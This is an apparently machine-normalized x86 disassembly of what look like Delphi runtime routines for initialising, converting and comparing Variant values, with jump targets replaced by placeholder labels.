call sub_4099ac
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404944
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_4099ac
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404944
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_41252c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404834
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_412564
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404834
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_404908
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4049f4
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_41259c
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_404834
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_40850c
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404944
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_40850c
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404944
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_40850c
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404944
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_4085f8
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404944
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_4085f8
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404944
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412f3c
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_412d58
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404834
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413495
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_404810
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_40413c
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_404810
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_40413c
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_404810
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_40413c
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_404810
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40413c
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_412e10
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404834
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404944
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40ecc4
test ah 0x40
je r-xdata
mov eax esi
call sub_4047f8
mov edx eax
mov eax ebx
call sub_412e74
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_412d58
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404834
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_412d58
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404834
jmp r-xdata
jmp [ eax * 4 + jump_table_4131fd ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_40850c
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404944
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_40850c
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404944
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_4099ac
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404944
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_4099ac
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404944
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_41252c
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404834
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_412564
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404834
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_404908
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_41259c
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404834
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_40850c
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404944
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_40850c
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404944
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_40850c
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404944
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_4085f8
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404944
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_4085f8
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404944
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412f3c
jmp r-xdata
sub_41349c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413506
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f824
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_405ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41350d
lea eax [ ebp - 0x10 ]
call sub_40f4fc
retn
mov dx 0xd
mov ax 0x101
call sub_40ecc4
sub_413514
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_41349c
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405ad0
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_405ad0
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_405ab8
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
mov ax [ ebx ]
call sub_414a10
test al al
je r-xdata
mov eax esi
call sub_405ab8
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_40ecc4
jmp r-xdata
mov ax [ ebx ]
mov dx 0xd
call sub_40ecc4
mov eax esi
call sub_405ab8
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_4033d0
test al al
jne r-xdata
sub_4135e0
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
mov ax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_405ab8
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_405ab8
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_40ecc4
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_405ad0
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_405ad0
jmp r-xdata
jmp r-xdata
mov edx esp
mov ax [ ebx ]
call sub_414a10
test al al
je r-xdata
mov ax [ ebx ]
mov dx 0x9
call sub_40ecc4
mov eax esi
call sub_405ab8
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_4033d0
test al al
jne r-xdata
sub_41368c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40f480
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_4136c8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f480
sub_4136e8
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f480
sub_413708
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f480
sub_413728
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_40f480
sub_413748
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_40f480
sub_413768
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_40f480
sub_413788
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f480
sub_4137b4
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_40f480
sub_4137d8
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f480
sub_413804
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f480
sub_413830
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40f480
sub_41385c
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40f480
sub_4138c0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_40416c
pop esi
pop ebx
retn
mov eax ebx
call sub_40f480
sub_4138ec
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_4049f4
pop esi
pop ebx
retn
mov eax ebx
call sub_40f480
sub_413924
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405ad0
pop esi
pop ebx
retn
mov eax ebx
call sub_40f480
sub_413950
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_405ad0
pop esi
pop ebx
retn
mov eax ebx
call sub_40f480
sub_41397c
push ebx
mov ebx eax
and bx 0xfff
cmp bx 0x14
jbe r-xdata
mov eax ebx
pop ebx
retn
cmp bx 0x100
jne r-xdata
call sub_40ed60
mov bx 0x8
jmp r-xdata
sub_4139a0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413a63
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x11 ]
call sub_40f824
cmp [ esi ] 0x101
jne r-xdata
cmp [ ebx ] 0x101
jne r-xdata
lea eax [ ebp - 0x11 ]
call [ rw-data ]
mov edx ebx
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_414254
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413a6a
lea eax [ ebp - 0x11 ]
call sub_40f4fc
retn
lea eax [ ebp - 0x21 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413a37
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x21 ]
call sub_40f824
lea eax [ ebp - 0x21 ]
call [ rw-data ]
lea edx [ ebp - 0x21 ]
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_414254
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x21 ]
call sub_40f4fc
retn
sub_413a88
push ebx
push ecx
mov [ esp ] dl
mov bl 0x1
mov edx ecx
sub edx 0xe
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
je r-xdata
call sub_40edb4
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
sub edx 0x4
jb r-xdata
mov eax ebx
pop edx
pop ebx
retn
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40edb4
jmp r-xdata
je r-xdata
mov dl [ rw-data ]
sub dl 0x1
jb r-xdata
jmp r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_40edb4
jmp r-xdata
je r-xdata
call sub_40ed60
xor eax eax
jmp r-xdata
cmp [ esp ] 0x2
je r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
mov bl [ ecx * 2 + rw-data ]
jmp r-xdata
dec dl
je r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
mov al 0x1
mov al 0x1
cmp [ esp ] 0x2
jne r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
and eax 0x7f
mov bl [ eax + rw-data ]
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_413b84
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x10
mov al 0x1
mov al 0x2
jmp r-xdata
jmp r-xdata
sub_413bc0
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413be8
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413c10
push ebp
mov ebp esp
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jbe r-xdata
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jae r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_413c3c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_413c97
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_412814
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_412814
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4080dc
xor edx edx
call sub_413b70
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413c9e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
sub_413ca8
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov ax [ esi ]
call sub_41397c
movzx eax ax
mov bl [ eax + rw-data ]
mov ax [ edi ]
call sub_41397c
movzx eax ax
mov al [ eax + rw-data ]
xor edx edx
mov dl al
xor ecx ecx
mov cl bl
imul ecx ecx 0xb
add ecx rw-data
movzx edx [ ecx + edx ]
cmp edx 0xa
ja r-xdata
call sub_40ed60
mov al 0x1
jmp [ edx * 4 + jump_table_413cf9 ]
call sub_40ed60
mov al 0x1
jmp r-xdata
mov edx eax
mov eax ebx
call sub_413a74
jmp r-xdata
mov ecx ebp
mov edx eax
mov eax ebx
call sub_413a88
jmp r-xdata
mov eax edi
call sub_40feb4
push eax
mov eax esi
call sub_40feb4
pop edx
call sub_413b70
jmp r-xdata
mov eax esi
call sub_410978
push edx
push eax
mov eax edi
call sub_410978
push edx
push eax
call sub_413b84
jmp r-xdata
mov eax esi
call sub_411488
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_411488
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_413bc0
jmp r-xdata
mov eax esi
call sub_411bf8
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_411bf8
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_413be8
jmp r-xdata
mov eax esi
call sub_412160
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax edi
call sub_412160
add esp 0xfffffff8
fistp [ esp ]
fwait
call sub_413c10
jmp r-xdata
mov edx edi
mov eax esi
call sub_413c3c
jmp r-xdata
mov eax edi
call sub_410f74
and eax 0x7f
push eax
mov eax esi
call sub_410f74
and eax 0x7f
pop edx
call sub_413b70
jmp r-xdata
mov edx edi
mov eax esi
mov ecx ebp
call sub_4139a0
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_413e34
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x9 ] 0x1
mov si [ ebx ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
test ax ax
jne r-xdata
test si si
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp ax 0x1
jne r-xdata
mov dl 0x1
xor eax eax
call sub_413a74
mov [ ebp - 0x9 ] al
jmp r-xdata
cmp si 0x1
jne r-xdata
xor edx edx
mov al 0x1
call sub_413a74
mov [ ebp - 0x9 ] al
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_414a10
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x2
xor eax eax
call sub_413a88
mov [ ebp - 0x9 ] al
jmp r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
call sub_414a10
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
xor edx edx
mov al 0x2
call sub_413a88
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx 0xb
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x8 ]
test al al
je r-xdata
call sub_40ed60
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40ed60
jmp r-xdata
mov esi [ ebp - 0x4 ]
mov si [ esi ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413fcd
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebx ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40faf0
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebx ]
je r-xdata
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax esi
call sub_414a10
test al al
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41415f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40faf0
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0x28 ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4140bd
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xe ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40faf0
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_413ca8
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f4fc
retn
call sub_40ec70
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413f3f
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40faf0
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebp - 0xc ]
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40ed60
jmp r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x8 ]
call sub_413ca8
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f4fc
retn
call sub_40ec70
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f4fc
retn
call sub_40ec70
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f4fc
retn
call sub_40ec70
call sub_40ed60
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_414215
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40faf0
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40f4fc
retn
call sub_40ec70
sub_414254
push esi
push edi
mov si [ eax ]
mov di [ edx ]
cmp si 0x10f
jae r-xdata
cmp si 0x400c
jne r-xdata
cmp di 0x10f
jae r-xdata
cmp di 0x400c
jne r-xdata
mov eax [ eax + 0x8 ]
call sub_414254
jmp r-xdata
call sub_413ca8
pop edi
pop esi
retn
and si 0xfff
cmp si 0x10f
jae r-xdata
mov edx [ edx + 0x8 ]
call sub_414254
jmp r-xdata
pop edi
pop esi
retn
call sub_413e34
and di 0xfff
cmp di 0x10f
jae r-xdata
call sub_413ca8
jmp r-xdata
sub_414440
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414566
push [ fs : eax ]
mov [ fs : eax ] esp
